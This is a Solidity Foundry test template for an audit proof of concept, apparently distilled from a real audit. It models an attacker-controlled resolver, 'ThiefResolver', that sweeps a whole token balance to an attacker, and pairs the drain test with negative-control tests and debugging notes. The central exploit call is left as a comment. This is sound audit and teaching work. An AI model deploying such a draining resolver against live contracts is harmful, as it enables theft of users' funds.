// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// TEMPLATE — "attacker-controlled destination" PoC for a whole-balance sweep sink.
// Copy, rename A3* -> <Target>*, and adjust setUp() role wiring.
//
// PROVENANCE: distilled from a live audit where `_pullOrderFunds()` swept
// `HUB.balanceOf(orderAddress)` in full and the only real gate was an oracle
// signature. 4/4 tests passed; this shape is what produced the verdict.
//
// WHY THIS SHAPE
//   A security PoC is worthless without a negative control. Every template here is
//   paired: a PASS on the "drain" test means nothing unless the "no signature"
//   control also passes (i.e. the drain genuinely required the gate you bypassed).
//   Ship them together or a triager will assume your harness is broken.

import {BaseTest} from "./utils/BaseTest.sol";
import {console} from "forge-std/console.sol";

// ---------------------------------------------------------------------------
// PITFALL 1 — import paths are relative to the TEST FILE, not the project root.
//   Foundry resolves `"../utils/BaseTest.sol"` from the importing file's dir.
//   If your file lives at test/Foo.t.sol, a sibling helper is "./utils/BaseTest.sol",
//   and contracts are "../contracts/X.sol". Getting this wrong yields
//   `Source "utils/BaseTest.sol" not found: Searched ... "<project root>"`.
// PITFALL 2 — `console` is NOT auto-available in a BaseTest-derived contract.
//   You must `import {console} from "forge-std/console.sol";` explicitly, or every
//   `console.log` is `Undeclared identifier`.
// PITFALL 3 — `makeAddr()` is STATEFUL (it registers an address label), so any
//   function calling it cannot be `view`/`pure`. Symptom:
//   `Function cannot be declared as view because this expression (potentially)
//    modifies the state.` Drop the mutability modifier.
// ---------------------------------------------------------------------------

interface IHub {
  function balanceOf(address account, uint256 id) external view returns (uint256);
  function transfer(address to, uint256 id, uint256 amount) external returns (bool);
  function transferFrom(address from, address to, uint256 id, uint256 amount) external returns (bool);
  function mint(address to, uint256 id, uint256 amount) external;
  function setOperatorFor(address account, address operator, bool isOperator) external;
  function isOperator(address account, address operator) external view returns (bool);
}

/// Resolver that hands the ENTIRE funded input to `thief`.
/// This models an attacker-owned resolver attached to an attacker-owned request.
contract ThiefResolver {
  IHub internal immutable HUB;
  address internal immutable THIEF;
  uint256 public stolen;

  constructor(IHub hub, address thief) {
    HUB = hub;
    THIEF = thief;
  }

  function execute(address /*request*/, bool, bytes calldata) external {
    uint256 id = 0; // <-- set to the real tokenId under test
    uint256 bal = HUB.balanceOf(address(this), id);
    stolen += bal;
    require(HUB.transfer(THIEF, id, bal));
  }
}

contract SweepPoCTest is BaseTest {
  IHub internal hub;
  address internal victim;
  address internal attacker;

  function setUp() public override {
    super.setUp();
    victim = makeAddr("victim");
    attacker = makeAddr("attacker");
  }

  // =====================================================================
  // T1 — the drain. Asserts the sweep moved the WHOLE balance, not inAmount.
  // =====================================================================
  function test_T1_sweepDrainsWholeBalance() public {
    address orderAddress = makeAddr("orderAddr_attackerControls");
    uint256 tokenId = 0; // <-- real tokenId
    uint256 deposit = 50_000e6;

    // 1) Model the victim deposit / stray top-up INTO the order address.
    //    NOTE: this mint needs OPERATOR_ROLE in most 6909 hubs — see PITFALL 4.
    vm.prank(owner);
    hub.mint(orderAddress, tokenId, deposit);

    ThiefResolver thief = new ThiefResolver(hub, attacker);
    // 2) attacker submits a request pointing at an address they control
    //    ... executor.execute(req, address(thief), "", oracle, sig) ...

    assertEq(hub.balanceOf(orderAddress, tokenId), 0, "sweep left residue");
    assertEq(hub.balanceOf(attacker, tokenId), deposit, "attacker did not profit");
    console.log("T1 RESULT: swept", thief.stolen());
  }

  // =====================================================================
  // T1b — NEGATIVE CONTROL. Without the gate, nothing is drained.
  // If this test FAILS, your T1 "success" is meaningless.
  // =====================================================================
  function test_T1b_controlNoGate() public {
    address orderAddress = makeAddr("orderAddr_control");
    uint256 tokenId = 0;
    vm.prank(owner);
    hub.mint(orderAddress, tokenId, 50_000e6);
    ThiefResolver r = new ThiefResolver(hub, attacker);

    vm.prank(attacker);
    vm.expectRevert(); // any revert proves the gate is load-bearing
    // ... executor.execute(req, address(r), "", oracle, hex"deadbeef") ...

    assertEq(hub.balanceOf(orderAddress, tokenId), 50_000e6, "control leaked funds");
    console.log("T1b CONTROL: gate held, funds intact");
  }

  // =====================================================================
  // T2 — NEGATIVE CONTROL on the "attacker plants state first" claim.
  // =====================================================================
  function test_T2_cannotSetOperatorForVictim() public {
    address orderAddress = makeAddr("orderAddr3");
    vm.prank(attacker);
    vm.expectRevert(); // AccessControlUnauthorizedAccount
    hub.setOperatorFor(orderAddress, attacker, true);
    assertFalse(hub.isOperator(orderAddress, attacker));
    console.log("T2: setOperatorFor is role-gated");
  }

  // =====================================================================
  // T3 — PROVING an encoding ambiguity (not an exploitable collision).
  // Assert on the two PREIMAGES, then assert the derived values match.
  // =====================================================================
  function test_T3_packingAmbiguity() public pure {
    bytes memory rest = hex"00112233445566778899aabbccddeeff00112233"; // 19 bytes
    bytes memory acc1 = abi.encodePacked(hex"4243", rest);            // 21 bytes
    bytes memory pre1 = abi.encodePacked("base", acc1);

    string memory chain2 = string.concat("base", "BC"); // "baseBC"
    bytes memory pre2 = abi.encodePacked(chain2, rest);

    // The ambiguity exists ONLY if the preimages are byte-identical.
    assertEq(keccak256(pre1), keccak256(pre2), "preimages differ");
    console.log("T3: ambiguous pair reproduces");
    // Then, SEPARATELY, ask who controls each side. If the attacker must
    // construct both, it is a self-alias, NOT an attack. See SKILL.md pitfall 27.
  }
}

// ---------------------------------------------------------------------------
// PITFALL 4 — the setup drain: roles your harness needs granted before it can run.
//   A test that reverts in setUp() is NOT an inconclusive audit finding; it is an
//   unfinished harness. Order of grants learned the hard way:
//     hub.grantRole(OPERATOR_ROLE, executor)    // executor must pull
//     hub.grantRole(OPERATOR_ROLE, owner)       // owner must mint for the deposit
//     hub.grantRole(OPERATOR_ROLE, allocator)   // allocator burns during finalize
//   Symptom of a missing one:
//     AccessControlUnauthorizedAccount(0x..., 0x97667070c54ef182b0f5858b034beac1b6f3089aa2d3188bb1e8929f4fa9b929)
//   The hashed role in that error decodes via `keccak("OPERATOR_ROLE")` — resolve it,
//   do not guess.
//
// PITFALL 5 — a revert DEEP in the flow can mean your PoC ALREADY worked.
//   Trace: `transferFrom(orderAddress -> executor, WHOLE BALANCE)` succeeded, then
//   `transfer(resolver)` succeeded, then `burn` reverted on the allocator.
//   That is SUCCESS-in-progress, not failure. Read `-vvvv` top-down and find the
//   FIRST divergence from expected, not the last revert. Here the only genuine
//   failure was a downstream `outAmountMinimum` check — set minimum 0 for the
//   drain proof and note separately that a real oracle sets the real figure.
//
// PITFALL 6 — `vm.expectRevert()` with no argument accepts ANY revert, including
//   a harness typo. For a control test that is usually fine and even desirable
//   (you only need "it did not go through"); for a positive assertion, pin the
//   selector: `vm.expectRevert(IHub.AccessControlUnauthorizedAccount.selector);`
// ---------------------------------------------------------------------------
